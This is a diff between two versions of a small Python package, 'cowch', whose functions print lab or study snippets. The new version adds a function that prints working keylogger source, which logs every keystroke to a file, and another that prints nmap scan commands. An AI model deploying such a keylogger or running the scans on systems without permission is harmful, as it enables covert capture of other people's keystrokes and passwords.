# Comparing `tmp/cowch-0.2-py3-none-any.whl.zip` & `tmp/cowch-0.3-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,8 +1,8 @@
-Zip file size: 4254 bytes, number of entries: 6
--rw-rw-rw-  2.0 fat     7721 b- defN 23-Apr-24 19:45 cowch/__init__.py
--rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-24 19:59 cowch-0.2.dist-info/License.txt
--rw-rw-rw-  2.0 fat      360 b- defN 23-Apr-24 19:59 cowch-0.2.dist-info/METADATA
--rw-rw-rw-  2.0 fat       92 b- defN 23-Apr-24 19:59 cowch-0.2.dist-info/WHEEL
--rw-rw-rw-  2.0 fat        6 b- defN 23-Apr-24 19:59 cowch-0.2.dist-info/top_level.txt
-?rw-rw-r--  2.0 fat      439 b- defN 23-Apr-24 19:59 cowch-0.2.dist-info/RECORD
-6 files, 8625 bytes uncompressed, 3456 bytes compressed:  59.9%
+Zip file size: 4548 bytes, number of entries: 6
+-rw-rw-rw-  2.0 fat     8409 b- defN 23-Apr-25 02:32 cowch/__init__.py
+-rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-25 02:33 cowch-0.3.dist-info/License.txt
+-rw-rw-rw-  2.0 fat      360 b- defN 23-Apr-25 02:33 cowch-0.3.dist-info/METADATA
+-rw-rw-rw-  2.0 fat       92 b- defN 23-Apr-25 02:33 cowch-0.3.dist-info/WHEEL
+-rw-rw-rw-  2.0 fat        6 b- defN 23-Apr-25 02:33 cowch-0.3.dist-info/top_level.txt
+?rw-rw-r--  2.0 fat      439 b- defN 23-Apr-25 02:33 cowch-0.3.dist-info/RECORD
+6 files, 9313 bytes uncompressed, 3750 bytes compressed:  59.7%
```

## zipnote {}

```diff
@@ -1,19 +1,19 @@
 Filename: cowch/__init__.py
 Comment: 
 
-Filename: cowch-0.2.dist-info/License.txt
+Filename: cowch-0.3.dist-info/License.txt
 Comment: 
 
-Filename: cowch-0.2.dist-info/METADATA
+Filename: cowch-0.3.dist-info/METADATA
 Comment: 
 
-Filename: cowch-0.2.dist-info/WHEEL
+Filename: cowch-0.3.dist-info/WHEEL
 Comment: 
 
-Filename: cowch-0.2.dist-info/top_level.txt
+Filename: cowch-0.3.dist-info/top_level.txt
 Comment: 
 
-Filename: cowch-0.2.dist-info/RECORD
+Filename: cowch-0.3.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## cowch/__init__.py

```diff
@@ -297,8 +297,41 @@
 model <- tree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,method="class",control=tree.control(nobs = 150,mincut = 10))
 plot(model1)
 
 text(model,all=TRUE,cex=0.6)
 predict(model,iris)
 model2 <- ctree(Species ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width,data=mydata,controls=ctree_control(maxdepth=2))
 plot(model2)    
-    """)
+    """)
+
+def eh1():
+    print(""" 
+    #keylogger 
+
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = r"C:/Users/Admin/Desktop/dd"
+logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+   logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+  
+    
+    """)
+
+def eh2():
+    print(""" 
+    
+1) command :- nmap -sA -T4 scanme.nmap.org
+2)Command: nmap -p22,113,139 scanme.nmap.org
+3)Command: nmap -sF -T4 para
+4)Command: nmap –sN –p 22 scanme.nmap.org
+5)Command: nmap -sX -T4 scanme.nmap.org
+
+    
+    
+    """)
```

